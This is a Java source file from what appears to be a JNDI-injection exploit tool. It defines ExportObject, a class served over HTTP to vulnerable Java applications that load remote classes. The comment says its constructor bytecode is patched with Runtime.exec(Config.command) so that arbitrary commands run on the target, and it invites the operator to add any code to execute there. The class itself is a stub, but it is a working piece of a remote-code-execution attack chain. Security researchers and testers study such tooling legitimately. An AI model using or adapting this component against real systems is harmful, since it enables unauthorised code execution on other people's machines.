package artsploit;

import javax.naming.Context;
import javax.naming.Name;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Hashtable;

/**
 * ExportObject class is served via HTTP for URLClassloaders
 * the bytecode of this constructor is patched in the {@link HttpServer} class
 *  by adding a new Runtime.exec(Config.command) to the top of the constructor
 *  feel free to any code you want to execute on the target here
 */
public class ExportObject implements javax.naming.spi.ObjectFactory {
    public ExportObject() {

    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        return null;
    }
}